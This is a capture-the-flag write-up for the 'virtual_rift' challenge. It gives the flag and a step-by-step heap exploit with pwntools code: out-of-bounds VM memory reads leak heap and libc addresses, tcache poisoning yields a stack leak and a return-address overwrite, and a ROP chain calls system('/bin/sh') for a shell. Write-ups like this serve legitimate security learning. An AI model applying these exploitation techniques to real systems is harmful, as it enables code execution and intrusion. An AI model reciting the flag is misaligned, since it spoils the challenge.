# virtual_rift Solution

**Flag:** `nite{wh173r053_1s_7h3_k3y_70_17_4ll}`

## Heap Out-of-Bounds Read/Write

The VM's RAM is allocated with a size of `0x4000` bytes (16KB):

However, all bounds check assumes VM's RAM size is `0xFFFF` (65KB):

This allows a program running inside the VM to read from and write to memory far beyond the allocated `0x4000` bytes, leading to a heap out-of-bounds condition.

## Exploit Walkthrough

### 1. Heap Grooming

The first step is to manipulate the heap to create a predictable layout. This is done by creating a user and then creating three programs of specific sizes.

```python
create_user(r, 0, b"arikazo0")

select_user(r, 0)
create_program(r, 0, 0x430, b"random_stuff")
create_program(r, 1, 0x68, b"random_stuff")
create_program(r, 2, 0x68, b"random_stuff")
```

The `0x68` size is chosen to match the size of the `User` struct.

### 2. Information Leak

Next, we leak heap and `libc` addresses. This is done by creating a program that reads from memory outside the VM's RAM and prints the contents.

```assembly
push constant 13680
push constant 8
print xb
push constant 12560
push constant 8
print xb
exit
```

This program reads 8 bytes from offset `13680` (`0x3570`) and 8 bytes from offset `12560` (`0x3110`) relative to the start of the VM's data segment (`0x1000`). These offsets are carefully chosen to point to locations in heap that contains (the heap and `libc`) that are outside the VM's `0x4000` byte RAM.

deleted program 1 is at ram_memory + 0x1000 + 13680. It contains heap address.
deleted program 0 is at ram_memory + 0x1000 + 12560. It contains libc address.

```python
# The offset is from ram_address + 0x1000
create_program(r, 3, 0x68, b"\x00\x70\x35\x00\x08\x00\x19\x01\x00\x10\x31\x00\x08\x00\x19\x01\x1c")

delete_program(r, 1)
delete_program(r, 2)
delete_program(r, 0)
execute_program(r, 3)

r.recvuntil(b"Loaded")
r.recvline()
hexline = r.recvline().strip()

data = bytes.fromhex(hexline.decode())
heap_raw  = data[:8]
libc_raw  = data[8:]

heap_leak = u64(heap_raw) << 12
libc.address = libc_leak - 0x1e8b20
```


### 3. Arbitrary Write and Stack Leak

Now that we have the necessary addresses, we can poison tcache so that malloc will return arbitray address. We will overwrite the `fd` pointer of a freed tcache chunk to point to `environ - 0x68`. `environ` is a variable in `libc` that points to the environment variables on the stack.


```assembly
push constant 13824
push constant 8
read
exit
```

This program reads 8 bytes from the user and writes them to offset `13824` (`0x3600`). This is the address of deleted program 2

```python
mask = heap_leak >> 12

# writes environ to deleted program 2
create_program(r, 4, 0x100, b"\x00\x00\x36\x00\x08\x00\x1a\x1c")
execute_program(r, 4)
r.sendline(p64(mask ^ (libc.symbols['environ'] - (0x68) )))

back_to_main_menu(r)

# deleted program address is returned here
# user struct size is 0x68
create_user(r, 1, "arikazo1")

# &(environ - 0x68) is the address of this user struct. Last 20 bytes is username. After 20 bytes comes stack address
# which is printed along with username
create_user(r, 2, "a"*20)

stack_leak = u64(r.recvuntil(b"created\n").strip()[25:-8].ljust(8, b"\x00"))
```

When we create `user 2`, `malloc` will return a pointer to `environ - 0x68`.
The stack address is located just right after user name.
When the name is printed, this also prints stack address.

### 4. Return Address Overwrite

The final step is to overwrite the saved return address of the `handle_active_user` function on the stack.

```assembly
push constant 13104
push constant 8
read
```

This program writes 8 bytes to offset `13104` (`0x3330`). This is the address of deleted program 6.

```python
select_user(r, 0)
create_program(r, 5, 0x100, b"random_stuff")
create_program(r, 6, 0x100, b"random_stuff")

#push constant 13104
#push constant 8
#read
create_program(r, 7, 0x100, b"\x00\x30\x33\x00\x08\x00\x1a")
delete_program(r, 5)
delete_program(r, 6)

# address of ret_addr of function that handles active user
ret_addr = stack_leak - (0x1a0 + 0x8)
# writes ret_addr - 0x8 to deleted program 6.
# -0x8 because tcache was not alligned
# canary is not present in this function.
execute_program(r, 7)
r.sendline(p64(mask ^ (ret_addr)))
```

This overwrites the `fd` pointer of a freed tcache chunk with the address of the saved return address on the stack.

### 5. ROP Chain and Shell

Now, when we allocate a new program, it will be allocated at the location of the overwritten return address. We can then write a ROP chain to this program.

```python
# challenge/solve.py
rop = ROP(libc)
bin_sh = next(libc.search("/bin/sh"))
pop_rdi = rop.find_gadget(["pop rdi", "ret"])
ret = rop.find_gadget(["ret"])

rop.raw(pop_rdi)
rop.raw(bin_sh)
rop.raw(ret)
rop.raw(p64(libc.symbols["system"]))

create_program(r, 8, 0x100, b"random_stuff")
create_program(r, 9, 0x100, b"A"*8 + flat(rop.chain()))
back_to_main_menu(r)
```

When the function that handles active user returns, it will execute our ROP chain, which calls `system("/bin/sh")` and gives us a shell.



[Solve script](solve.py)
